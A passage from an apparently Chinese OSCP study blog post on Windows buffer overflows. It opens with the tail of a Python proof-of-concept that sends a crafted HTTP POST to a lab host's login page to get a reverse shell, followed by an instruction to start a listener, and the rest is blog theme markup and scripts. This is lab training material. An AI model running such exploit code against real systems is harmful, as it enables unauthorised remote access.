10.11.0.22\r\n&quot;</span><br>    buffer += <span class="hljs-string">&quot;User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n&quot;</span><br>    buffer += <span class="hljs-string">&quot;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n&quot;</span><br>    buffer += <span class="hljs-string">&quot;Accept-Language: en-US,en;q=0.5\r\n&quot;</span><br>    buffer += <span class="hljs-string">&quot;Referer: http://10.11.0.22/login\r\n&quot;</span><br>    buffer += <span class="hljs-string">&quot;Connection: close\r\n&quot;</span><br>    buffer += <span class="hljs-string">&quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;</span><br>    buffer += <span class="hljs-string">&quot;Content-Length: &quot;</span>+<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(content))+<span class="hljs-string">&quot;\r\n&quot;</span><br>    buffer += <span class="hljs-string">&quot;\r\n&quot;</span><br>    buffer += content<br><br>    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    <br>    s.connect((<span class="hljs-string">&quot;10.11.0.22&quot;</span>, <span class="hljs-number">80</span>))<br>    s.send(buffer)<br>    <br>    s.close()<br>    <br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;\nDone did you get a reverse shell?&quot;</span><br><span class="hljs-keyword">except</span>:<br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;\nCould not connect!&quot;</span><br></code></pre></td></tr></table></figure></li>
+<li>执行PoC前启动侦听<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220815110549.png" srcset="/img/loading.gif" lazyload></li>
+</ul>
+
+              
+            </div>
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/OSCP-Notes/" class="category-chain-item">OSCP-Notes</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/OSCP/">#OSCP</a>
+      
+        <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/">#漏洞挖掘</a>
+      
+        <a href="/tags/windows/">#windows</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Windows缓冲区溢出</div>
+      <div>https://c47sh4rk.github.io/2022/08/13/Windows缓冲区溢出/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>C47Sh4rk</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2022年8月13日</div>
+        </div>
+      
+      
+      <div class="license-meta-item">
+        <div>许可协议</div>
+        <div>
+          
+            
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+              <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                <i class="iconfont icon-by"></i>
+              </span>
+              </a>
+            
+          
+        </div>
+      </div>
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/08/15/Linux%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/" title="Linux缓冲区溢出">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Linux缓冲区溢出</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/08/13/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/" title="缓冲区溢出">
+                        <span class="hidden-mobile">缓冲区溢出</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
+  <script>
+  (function() {
+    var enableLang = CONFIG.code_language.enable && CONFIG.code_language.default;
+    var enableCopy = CONFIG.copy_btn;
+    if (!enableLang && !enableCopy) {
+      return;
+    }
+
+    function getBgClass(ele) {
+      return Fluid.utils.getBackgroundLightness(ele) >= 0 ? 'code-widget-light' : 'code-widget-dark';
+    }
+
+    var copyTmpl = '';
+    copyTmpl += '<div class="code-widget">';
+    copyTmpl += 'LANG';
+    copyTmpl += '</div>';
+    jQuery('.markdown-body pre').each(function() {
+      var $pre = jQuery(this);
+      if ($pre.find('code.mermaid').length > 0) {
+        return;
+      }
+      if ($pre.find('span.line').length > 0) {
+        return;
+      }
+
+      var lang = '';
+
+      if (enableLang) {
+        lang = CONFIG.code_language.default;
+        if ($pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2 && $pre.children().hasClass('hljs')) {
+          lang = $pre[0].children[0].classList[1];
+        } else if ($pre[0].getAttribute('data-language')) {
+          lang = $pre[0].getAttribute('data-language');
+        } else if ($pre.parent().hasClass('sourceCode') && $pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2) {
+          lang = $pre[0].children[0].classList[1];
+          $pre.parent().addClass('code-wrapper');
+        } else if ($pre.parent().hasClass('markdown-body') && $pre[0].classList.length === 0) {
+          $pre.wrap('<div class="code-wrapper"></div>');
+        }
+        lang = lang.toUpperCase().replace('NONE', CONFIG.code_language.default);
+      }
+      $pre.append(copyTmpl.replace('LANG', lang).replace('code-widget">',
+        getBgClass($pre[0]) + (enableCopy ? ' code-widget copy-btn" data-clipboard-snippet><i class="iconfont icon-copy"></i>' : ' code-widget">')));
+
+      if (enableCopy) {
+        Fluid.utils.createScript('https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js', function() {
+          var clipboard = new window.ClipboardJS('.copy-btn', {
+            target: function(trigger) {
+              var nodes = trigger.parentNode.childNodes;
+              for (var i = 0; i < nodes.length; i++) {
+                if (nodes[i].tagName === 'CODE') {
+                  return nodes[i];
+                }
+              }
+            }
+          });
+          clipboard.on('success', function(e) {
+            e.clearSelection();
+            e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-copy', 'icon-success');
+            setTimeout(function() {
+              e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-success', 'icon-copy');
+            }, 2000);
+          });
+        });
+      }
+    });
+  })();
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
